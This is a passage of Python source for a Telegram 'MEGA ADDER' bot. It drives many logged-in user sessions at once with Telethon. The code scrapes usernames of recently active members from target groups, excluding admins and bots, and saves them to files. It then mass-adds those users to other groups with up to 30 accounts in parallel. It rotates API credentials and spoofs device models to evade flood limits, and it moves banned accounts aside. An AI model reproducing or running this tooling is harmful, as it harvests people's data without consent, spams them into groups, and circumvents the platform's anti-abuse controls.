                        t8  = bot.loop.create_task(foo(tasklist[7] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t9  = bot.loop.create_task(foo(tasklist[8] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t10 = bot.loop.create_task(foo(tasklist[9] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6
                        res7 = await t7
                        res8 = await t8
                        res9 = await t9
                        res10 = await t10

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success   += int(res4[0])
                            faild     += int(res4[1])
                            duplicate += int(res4[2])  


                        if res5 != None:
                            success   += int(res5[0])
                            faild     += int(res5[1])
                            duplicate += int(res5[2])  



                        if res6 != None:
                            success   += int(res6[0])
                            faild     += int(res6[1])
                            duplicate += int(res6[2])  




                        if res7 != None:
                            success   += int(res7[0])
                            faild     += int(res7[1])
                            duplicate += int(res7[2])  

                        if res8 != None:
                            success   += int(res8[0])
                            faild     += int(res8[1])
                            duplicate += int(res8[2])  


                        if res9 != None:
                            success   += int(res9[0])
                            faild     += int(res9[1])
                            duplicate += int(res9[2])  



                        if res10 != None:
                            success   += int(res10[0])
                            faild     += int(res10[1])
                            duplicate += int(res10[2])  




                    elif numacc == 15:
                        t1   = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t2   = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t3   = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t4   = bot.loop.create_task(foo(tasklist[3] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t5   = bot.loop.create_task(foo(tasklist[4] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t6   = bot.loop.create_task(foo(tasklist[5] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t7   = bot.loop.create_task(foo(tasklist[6] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t8   = bot.loop.create_task(foo(tasklist[7] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t9   = bot.loop.create_task(foo(tasklist[8] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t10  = bot.loop.create_task(foo(tasklist[9] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t11  = bot.loop.create_task(foo(tasklist[10] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t12  = bot.loop.create_task(foo(tasklist[11] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t13  = bot.loop.create_task(foo(tasklist[12] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t14  = bot.loop.create_task(foo(tasklist[13] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t15  = bot.loop.create_task(foo(tasklist[14] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))

                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6
                        res7 = await t7
                        res8 = await t8
                        res9 = await t9
                        res10 = await t10

                        res11 = await t11
                        res12 = await t12
                        res13 = await t13
                        res14 = await t14
                        res15 = await t15

                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success   += int(res4[0])
                            faild     += int(res4[1])
                            duplicate += int(res4[2])  


                        if res5 != None:
                            success   += int(res5[0])
                            faild     += int(res5[1])
                            duplicate += int(res5[2])  



                        if res6 != None:
                            success   += int(res6[0])
                            faild     += int(res6[1])
                            duplicate += int(res6[2])  




                        if res7 != None:
                            success   += int(res7[0])
                            faild     += int(res7[1])
                            duplicate += int(res7[2])  

                        if res8 != None:
                            success   += int(res8[0])
                            faild     += int(res8[1])
                            duplicate += int(res8[2])  


                        if res9 != None:
                            success   += int(res9[0])
                            faild     += int(res9[1])
                            duplicate += int(res9[2])  



                        if res10 != None:
                            success   += int(res10[0])
                            faild     += int(res10[1])
                            duplicate += int(res10[2])  


                        if res11 != None:
                            success   += int(res11[0])
                            faild     += int(res11[1])
                            duplicate += int(res11[2])  



                        if res12 != None:
                            success   += int(res12[0])
                            faild     += int(res12[1])
                            duplicate += int(res12[2])  



                        if res13 != None:
                            success   += int(res13[0])
                            faild     += int(res13[1])
                            duplicate += int(res13[2])  



                        if res14 != None:
                            success   += int(res14[0])
                            faild     += int(res14[1])
                            duplicate += int(res14[2])  




                        if res15 != None:
                            success   += int(res15[0])
                            faild     += int(res15[1])
                            duplicate += int(res15[2])  





                    elif numacc == 20:
                        t1   = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))                    
                        t2   = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t3   = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t4   = bot.loop.create_task(foo(tasklist[3] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t5   = bot.loop.create_task(foo(tasklist[4] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t6   = bot.loop.create_task(foo(tasklist[5] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t7   = bot.loop.create_task(foo(tasklist[6] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t8   = bot.loop.create_task(foo(tasklist[7] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t9   = bot.loop.create_task(foo(tasklist[8] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t10  = bot.loop.create_task(foo(tasklist[9] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t11  = bot.loop.create_task(foo(tasklist[10] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t12  = bot.loop.create_task(foo(tasklist[11] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t13  = bot.loop.create_task(foo(tasklist[12] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t14  = bot.loop.create_task(foo(tasklist[13] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t15  = bot.loop.create_task(foo(tasklist[14] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t16  = bot.loop.create_task(foo(tasklist[15] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t17  = bot.loop.create_task(foo(tasklist[16] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t18  = bot.loop.create_task(foo(tasklist[17] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t19  = bot.loop.create_task(foo(tasklist[18] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t20  = bot.loop.create_task(foo(tasklist[19] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))

                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6
                        res7 = await t7
                        res8 = await t8
                        res9 = await t9
                        res10 = await t10

                        res11 = await t11
                        res12 = await t12
                        res13 = await t13
                        res14 = await t14
                        res15 = await t15

                        res16 = await t16
                        res17 = await t17
                        res18 = await t18
                        res19 = await t19
                        res20 = await t20


                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success   += int(res4[0])
                            faild     += int(res4[1])
                            duplicate += int(res4[2])  


                        if res5 != None:
                            success   += int(res5[0])
                            faild     += int(res5[1])
                            duplicate += int(res5[2])  



                        if res6 != None:
                            success   += int(res6[0])
                            faild     += int(res6[1])
                            duplicate += int(res6[2])  




                        if res7 != None:
                            success   += int(res7[0])
                            faild     += int(res7[1])
                            duplicate += int(res7[2])  

                        if res8 != None:
                            success   += int(res8[0])
                            faild     += int(res8[1])
                            duplicate += int(res8[2])  


                        if res9 != None:
                            success   += int(res9[0])
                            faild     += int(res9[1])
                            duplicate += int(res9[2])  



                        if res10 != None:
                            success   += int(res10[0])
                            faild     += int(res10[1])
                            duplicate += int(res10[2])  


                        if res11 != None:
                            success   += int(res11[0])
                            faild     += int(res11[1])
                            duplicate += int(res11[2])  



                        if res12 != None:
                            success   += int(res12[0])
                            faild     += int(res12[1])
                            duplicate += int(res12[2])  



                        if res13 != None:
                            success   += int(res13[0])
                            faild     += int(res13[1])
                            duplicate += int(res13[2])  



                        if res14 != None:
                            success   += int(res14[0])
                            faild     += int(res14[1])
                            duplicate += int(res14[2])  




                        if res15 != None:
                            success   += int(res15[0])
                            faild     += int(res15[1])
                            duplicate += int(res15[2])  



                        if res16 != None:
                            success   += int(res16[0])
                            faild     += int(res16[1])
                            duplicate += int(res16[2])  



                        if res17 != None:
                            success   += int(res17[0])
                            faild     += int(res17[1])
                            duplicate += int(res17[2])  




                        if res18 != None:
                            success   += int(res18[0])
                            faild     += int(res18[1])
                            duplicate += int(res18[2])  




                        if res19 != None:
                            success   += int(res19[0])
                            faild     += int(res19[1])
                            duplicate += int(res19[2])  




                        if res20 != None:
                            success   += int(res20[0])
                            faild     += int(res20[1])
                            duplicate += int(res20[2])  




                    elif numacc == 30:
                        t1   = bot.loop.create_task(foo(tasklist[0] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t2   = bot.loop.create_task(foo(tasklist[1] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t3   = bot.loop.create_task(foo(tasklist[2] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t4   = bot.loop.create_task(foo(tasklist[3] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t5   = bot.loop.create_task(foo(tasklist[4] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t6   = bot.loop.create_task(foo(tasklist[5] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t7   = bot.loop.create_task(foo(tasklist[6] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t8   = bot.loop.create_task(foo(tasklist[7] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t9   = bot.loop.create_task(foo(tasklist[8] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t10  = bot.loop.create_task(foo(tasklist[9] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t11  = bot.loop.create_task(foo(tasklist[10] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t12  = bot.loop.create_task(foo(tasklist[11] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t13  = bot.loop.create_task(foo(tasklist[12] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t14  = bot.loop.create_task(foo(tasklist[13] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t15  = bot.loop.create_task(foo(tasklist[14] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t16  = bot.loop.create_task(foo(tasklist[15] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t17  = bot.loop.create_task(foo(tasklist[16] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t18  = bot.loop.create_task(foo(tasklist[17] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t19  = bot.loop.create_task(foo(tasklist[18] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t20  = bot.loop.create_task(foo(tasklist[19] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t21  = bot.loop.create_task(foo(tasklist[20] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t22  = bot.loop.create_task(foo(tasklist[21] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t23  = bot.loop.create_task(foo(tasklist[22] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t24  = bot.loop.create_task(foo(tasklist[23] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t25  = bot.loop.create_task(foo(tasklist[24] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t26  = bot.loop.create_task(foo(tasklist[25] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t27  = bot.loop.create_task(foo(tasklist[26] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t28  = bot.loop.create_task(foo(tasklist[27] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t29  = bot.loop.create_task(foo(tasklist[28] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))
                        t30  = bot.loop.create_task(foo(tasklist[29] , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))

                                
                        tasklist = []

                        res1 = await t1
                        res2 = await t2
                        res3 = await t3
                        res4 = await t4
                        res5 = await t5
                        res6 = await t6
                        res7 = await t7
                        res8 = await t8
                        res9 = await t9
                        res10 = await t10

                        res11 = await t11
                        res12 = await t12
                        res13 = await t13
                        res14 = await t14
                        res15 = await t15

                        res16 = await t16
                        res17 = await t17
                        res18 = await t18
                        res19 = await t19
                        res20 = await t20



                        res21 = await t21
                        res22 = await t22
                        res23 = await t23
                        res24 = await t24
                        res25 = await t25




                        res26 = await t26
                        res27 = await t27
                        res28 = await t28
                        res29 = await t29
                        res30 = await t30
                        if res1 != None:

                            success   += int(res1[0])
                            faild     += int(res1[1])
                            duplicate += int(res1[2])

                        if res2 != None:
                            success   += int(res2[0])
                            faild     += int(res2[1])
                            duplicate += int(res2[2])                            


                        if res3 != None:
                            success   += int(res3[0])
                            faild     += int(res3[1])
                            duplicate += int(res3[2])

                        if res4 != None:
                            success   += int(res4[0])
                            faild     += int(res4[1])
                            duplicate += int(res4[2])  


                        if res5 != None:
                            success   += int(res5[0])
                            faild     += int(res5[1])
                            duplicate += int(res5[2])  



                        if res6 != None:
                            success   += int(res6[0])
                            faild     += int(res6[1])
                            duplicate += int(res6[2])  




                        if res7 != None:
                            success   += int(res7[0])
                            faild     += int(res7[1])
                            duplicate += int(res7[2])  

                        if res8 != None:
                            success   += int(res8[0])
                            faild     += int(res8[1])
                            duplicate += int(res8[2])  


                        if res9 != None:
                            success   += int(res9[0])
                            faild     += int(res9[1])
                            duplicate += int(res9[2])  



                        if res10 != None:
                            success   += int(res10[0])
                            faild     += int(res10[1])
                            duplicate += int(res10[2])  


                        if res11 != None:
                            success   += int(res11[0])
                            faild     += int(res11[1])
                            duplicate += int(res11[2])  



                        if res12 != None:
                            success   += int(res12[0])
                            faild     += int(res12[1])
                            duplicate += int(res12[2])  



                        if res13 != None:
                            success   += int(res13[0])
                            faild     += int(res13[1])
                            duplicate += int(res13[2])  



                        if res14 != None:
                            success   += int(res14[0])
                            faild     += int(res14[1])
                            duplicate += int(res14[2])  




                        if res15 != None:
                            success   += int(res15[0])
                            faild     += int(res15[1])
                            duplicate += int(res15[2])  



                        if res16 != None:
                            success   += int(res16[0])
                            faild     += int(res16[1])
                            duplicate += int(res16[2])  



                        if res17 != None:
                            success   += int(res17[0])
                            faild     += int(res17[1])
                            duplicate += int(res17[2])  




                        if res18 != None:
                            success   += int(res18[0])
                            faild     += int(res18[1])
                            duplicate += int(res18[2])  




                        if res19 != None:
                            success   += int(res19[0])
                            faild     += int(res19[1])
                            duplicate += int(res19[2])  




                        if res20 != None:
                            success   += int(res20[0])
                            faild     += int(res20[1])
                            duplicate += int(res20[2])  




                        if res21 != None:
                            success   += int(res21[0])
                            faild     += int(res21[1])
                            duplicate += int(res21[2])  


                        if res22 != None:
                            success   += int(res22[0])
                            faild     += int(res22[1])
                            duplicate += int(res22[2])  



                        if res23 != None:
                            success   += int(res23[0])
                            faild     += int(res23[1])
                            duplicate += int(res23[2])  



                        if res24 != None:
                            success   += int(res24[0])
                            faild     += int(res24[1])
                            duplicate += int(res24[2])  



                        if res25 != None:
                            success   += int(res25[0])
                            faild     += int(res25[1])
                            duplicate += int(res25[2])  




                        if res26 != None:
                            success   += int(res26[0])
                            faild     += int(res26[1])
                            duplicate += int(res26[2])  



                        if res27 != None:
                            success   += int(res27[0])
                            faild     += int(res27[1])
                            duplicate += int(res27[2])  



                        if res28 != None:
                            success   += int(res28[0])
                            faild     += int(res28[1])
                            duplicate += int(res28[2])  




                        if res29 != None:
                            success   += int(res29[0])
                            faild     += int(res29[1])
                            duplicate += int(res29[2])  


                        if res30 != None:
                            success   += int(res30[0])
                            faild     += int(res30[1])
                            duplicate += int(res30[2])  











            remainAcc = len(tasklist)
            #print (remainAcc)
            for item in tasklist:

                if totalScounter >= solve :
                    break
               
                if kosflag == 1 :
                    
                    break


                taskCount +=1
                
                t1 = bot.loop.create_task(foo(item , events , link , numacc , delay , worker_msg , mode , num, cancelALL , solve))

                res = await t1

                if res != None:

                    success   += int(res[0])
                    faild     += int(res[1])
                    duplicate += int(res[2])


            kosflag = 0
            end = time.time()

            text = '''●╔══** Adding to `{}` with `{}` Accounts **  ** add Peer :** `{}`\n\n 🏆 Add Completed at  {}

        ●╚══[⚡️ MEGA ADDER ⚡️]'''.format(link, numacc, delay, str(datetime.timedelta(seconds=(end-start)))[0:7])

            print(colored('[$]', 'white'), colored(f' Order Finished at {str(datetime.timedelta(seconds=(end-start)))[0:7]}', 'yellow'))

            usernames.clear()
            
            try:
                await events.reply(text , buttons=[[Button.inline("✅Success", "None") , Button.inline(str(totalScounter) , "None")]  , [Button.inline("❌Failed" ,"None") , Button.inline(str(totalFcounter) , "None")] , [Button.inline("⚠️Duplicate" ,"None") , Button.inline(str(duplicate) , "None")]])
            
            except Exception as e:
                print ("---------> " , e   , e.__class__)
                pass



        if callback.startswith("@"):

            [_ , mode , link]  = callback.split("|")

            print (link)

            cont=0


            if '@' in link or 'joinchat' in link:
                ev = []

                if 'joinchat' in link:
                    link = link.split('/')[-1]

                
                if mode == "addUsername":

                    for item in os.scandir('Accounts'):
                        if 'journal' not in item.name and '.session' in item.name:
                            l = [[Button.inline(item.name,'*l|{}|{}'.format(item.name, link))]]
                            ev.extend(l)
                            cont+=1
                    
                    try:        
                        await events.reply('🔆Please Select One Of the number  \nhttps://t.me/joinchat/{}'.format(link),buttons=ev)
            

                    except errors.rpcerrorlist.ReplyMarkupTooLongError:
                        for i in await list_splitter(ev , 20):
                            #print (i)

                            await events.reply('🔆Please Select One Of the number  \nhttps://t.me/joinchat/{}'.format(link),buttons=i)

                if mode == "addChatid":


                    ev = [Button.inline('Close','close'),Button.inline('✅ Start','#l|{}'.format(link)) ]
                    
      
                    await events.reply('🔆 https://t.me/joinchat/{} '.format(link),buttons=ev)






            else:
                await events.reply('🔆 Please Enter Valid Link !\n🆘https://t.me/joinchat/example\n🆘@group')


        if callback.startswith("$cancel"):
            x = callback.split("|")[1]
            w = random.choice(apis)

            new =  TelegramClient(f'Accounts/{x}',w[0], w[1])


            await new.disconnect()
            await events.answer("‼️ cancel")
            await asyncio.sleep(1)
            await events.delete()


        if callback.startswith("&cancelALL"):
            kosflag = 1
            await events.answer("‼️ All Accs Will Cancel")


        if callback.startswith("acccancell"):
            print (callback.split("|"))
            x = callback.split("|")[1]
            addflag[x] = "0"
            await events.answer("Add with this Account Completed !")


        if callback.startswith(".addcencell"): 
            
            x = callback.split("|")[1]
            
            noadd = "0"
            await events.answer("Add with this Account Completed !")

        if callback == "nexthelp":
            await events.edit(''' `leach` @group t.me/joinchat/t…

 For leach Users From گروه مقصد Group
▬▭▬▭▬▭▬▭▬▭▬▭\n 
● `accounts`

For Show Delete or sort accounts
▬▭▬▭▬▭▬▭▬▭▬▭\n 
● `load` File Name all

Load File  
Load all load all lists and show you
▬▭▬▭▬▭▬▭▬▭▬▭\n 
● `info`

For See How Much usernames Loaded
▬▭▬▭▬▭▬▭▬▭▬▭\n 
● `ping`

For Check bot status
▬▭▬▭▬▭▬▭▬▭▬▭\n 

● `add` link numberOFAcc NumberOffAdd
\n

• numberOFAcc  : `How many acc work?` [num] 
• NumberOffAdd : `How many add Per acc` 

▬▭▬▭▬▭▬▭▬▭▬▭\n 
• /admin ID 

For admin a user with it's ID

▬▭▬▭▬▭▬▭▬▭▬▭\n 
• /sudolist  

For Show Sudo List

▬▭▬▭▬▭▬▭▬▭▬▭\n 
• /remadmin ID

Remove a User from Admin List

▬▭▬▭▬▭▬▭▬▭▬▭\n 


Add users to group link starts with @ or t.me/joinchat/ 
Pay Attention Max Number is **50**
▬▭▬▭▬▭▬▭▬▭▬▭\n ''' , buttons=[[Button.inline('◀️' ,'backhelp' ) , Button.inline('Close','close')] ]
            ) 





        if callback =="backhelp":
            await events.edit('▬▭▬▭▬▭▬▭▬▭▬▭\n ●** help** \n\nFor Show Help Message \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/login** `Phone Number`\n\n For Login New Account \n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/auth** `CODE`\n\nFor Verify Web Login\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/code** `CODE`\n\nFor Login With Code\n▬▭▬▭▬▭▬▭▬▭▬▭\n● **/step** `PASSWORD`\n\nFor Login With 2FA Password\n' , buttons = [
                [Button.inline('Close ','close'),Button.inline('▶️','nexthelp') ]
            ]) 



        if callback.startswith("#l"):
            
            device = random.choice(devices)
            version1 = random.choice(version)

            [_,link] = callback.split('|')

            flag = 0

            count =0

            for item in os.scandir('Accounts'):
                if 'journal' not in item.name and '.session' in item.name:
                    
                    phone = item.name

                    count +=1
                    sleep(0.5)
                    
                    

                    await events.edit('| Please Wait \n👽 Bot : {} '.format(count), buttons=[[Button.inline( "Connection ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Get Info ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Membership ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Leaching ", "❌"), Button.inline( "❌", "✅")] ])
                    
                    #### --- anti flood
                    apis2 = random.choice(apis)

                    sleep(0.5)


                    if apis2 != 0:

                        try:
                        
                            ww = False

                            await events.edit("/ Please Wait \n👽 Bot : {}".format(count) ,  buttons=[[Button.inline( "Connection", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Get Info ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Membership ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Leaching ", "❌"), Button.inline( "❌", "✅")] ])

                            client = TelegramClient('Accounts/{}'.format(phone),int(apis2[0]),apis2[1],

                                          device_model=device,
              system_version=version1,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')
                            
                            await client.connect()
                            
                            ww = await join(client,link ,phone , events)
                            
                            if ww == True:
                            
                                keu = link

                                

                                await events.edit('|  Please Wait  Bot : {} '.format(count), buttons=[[Button.inline( "Connection ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Get Info ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Membership", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Leaching ", "❌"), Button.inline( "❌", "✅")]  ,[Button.inline("‼️ cancel" , f"$cancel|{phone}")]]  )

                            
                                if '@' in link:
                            
                                    keu = link.split('@')[1]
                            

                                if (flag):

                                    links = link 

                                    if not '@' in link:
                                
                                        links = 'https://t.me/joinchat/{}'.format(link)                                   
                                    
                                
                                    for item in await  client.get_participants(links):
                                        counter+=1

                                
                                

                                elif (flag == 0):

                                    

                                    f1 = open('Database/{}id.txt'.format(keu),'w')
                                 
                                    counter = 0

                                    links = link
                                    
                                    if not '@' in link:
                                
                                        links = 'https://t.me/joinchat/{}'.format(link)
                                
                                    # for item in await client.get_participants(links):
                                    #     if online_within(item , 6):
                                    #         f1.write(str(item.id) + "\n")

                                    #         counter +=1




                                    f1.close()
                                    await bot.send_file(events.chat_id, 'Database/{}id.txt'.format(keu), caption="🎗 Total `{}` گرفتن اعضا Users.\n\n  **You Can Load This Users with command load {}\nYou can see all lists with `load all`** ".format(counter, keu))    
                                    flag = 1

                                await events.edit('/  Please Wait \n  👽 Bot : {}'.format(count),  buttons=[[Button.inline( "Connection", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Get Info  ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Membership", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Leaching {}.. ".format(counter), "❌"), Button.inline( "✅", "✅")] ,[Button.inline("‼️ cancel" , f"$cancel|{phone}")]]  )

                                
                                await client.disconnect()            
                            elif ww == -1:
                                await events.edit('Your account has been deleted ! ...')
                                
                                await client.disconnect()
                                shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
                            elif ww == -2:
                                await events.edit('Sorry Bot kicked out from sessions ...')
                                await client.disconnect()


                            elif ww == -3:
                                await events.edit("Session Runed in Two different IP address plz choose another acc")
                                await client.disconnect()


                            elif ww == -4 :
                                await events.edit("sessions Error")
                            

                            elif ww == -1000:
                                await events.edit("FloodWait Error ")  

                        except ValueError:
                            await events.respond("این لینک منقضی شده و یا درست نیست ")
                            await client.disconnect()

                        except errors.rpcerrorlist.FloodWaitError as e:
                            wait = [int(s) for s in str(e).split() if s.isdigit()][0]
                            await events.respond(" `FloodWait ` : {} \n Try another Account".format(wait))
                            await client.disconnect()

                        except Exception as e:
                            await events.respond(" `Error ID PART ` : {} \n Tring  another Account".format(e.__class__))
                            await client.disconnect()                    

                    else:
                        await events.edit('Error In find api data for account {}! Please Re Login this account!'.format(phone))

            await events.reply("✅ Job Finished \n Use load all ")



        if callback.startswith('*l'):
            
            device = random.choice(devices)
            

            
            [_, phone , link ] = callback.split('|')

            await events.answer('Please Wait ')
            sleep(0.5)

            await events.edit('| Please Wait \n👽 Bot ', buttons=[[Button.inline( "Connection ", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Get Info ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Membership ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Leaching ", "❌"), Button.inline( "❌", "✅")] ])
                    

            #### --- anti flood
            apis2 = random.choice(apis)

            sleep(0.5)



            if apis2 != 0:

                # try:

                    ww = False

                    await events.edit("/ Please Wait \n👽 Bot" ,  buttons=[[Button.inline( "Connection", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Get Info ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Membership ", "❌"), Button.inline( "❌", "✅")] , [Button.inline( "Leaching ", "❌"), Button.inline( "❌", "✅")] ])

                    print ("before client")
                    client = TelegramClient('Accounts/{}'.format(phone),int(apis2[0]),apis2[1] ,              device_model=device,
              app_version="7.84",
              lang_code='en',
              system_lang_code='en')

                    print ("after client")
                    await client.connect()
                    print ("afler connect")


                    ww = await join(client,link , phone , events) ### if user Already in group & joint in it -> ww = 1
                    print ("after join")

                    

                    if ww == True:
                    
                        keu = link
                        await events.edit('/  Please Wait \n  👽 Bot ',  buttons=[[Button.inline( "Connection", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Get Info  ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Membership", "❌"), Button.inline( "✅", "✅")] ,[Button.inline("‼️ cancel" , f"$cancel|{phone}")]]  )

                    
                        if '@' in link:
                    
                            keu = link.split('@')[1]
                    


                    
                        f1 = open('Database/{}.txt'.format(keu),'w')
                    

                        counter = 0

                        links = link
                    
                        if not '@' in link:
                    
                            links = 'https://t.me/joinchat/{}'.format(link)
                        
                        participants = await  client.get_participants(links , filter =ChannelParticipantsAdmins)

                        dontaddme = []

                        for admins in participants:
                            if admins.username != None :
                                dontaddme.append(admins.username)

                        async for item in client.iter_participants(links , aggressive=True ):
                            if item.username != None:
                                    

                                if online_within(item , 5) and  str(item.username) not in dontaddme and "bot" not in str(item.username) and "BOT" not in str(item.username) and "_bot" not in str(item.username): 
                                    f1.write(str(item.username) + '\n')

                                
                                    counter+=1

                        f1.close()

                        await events.edit('/  Please Wait \n  👽 Bot ',  buttons=[[Button.inline( "Connection", "✅"), Button.inline( "✅ ", "✅")] ,[Button.inline( "Get Info  ", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Membership", "❌"), Button.inline( "✅", "✅")] , [Button.inline( "Leaching {}.. ".format(counter), "❌"), Button.inline( "✅", "✅")] ,[Button.inline("‼️ cancel" , f"$cancel|{phone}")]]  )

                        await bot.send_file(events.chat_id, 'Database/{}.txt'.format(keu), caption="🎗 Total `{}` Users \n\n  **You Can Load This Users with command load {}\nYou can see all lists with `load all`** ".format(counter, keu))    
                        await client.disconnect()            
                    elif ww == -1:
                        await events.edit('Your account has been deleted ! ...')
                        await client.disconnect()
                        shutil.move("Accounts/{}".format(phone), "Delete/{}".format(phone))
                    elif ww == -2:
                        await events.edit('Sorry Bot kicked out from sessions ...')
                        await client.disconnect()

                    elif ww == -3:
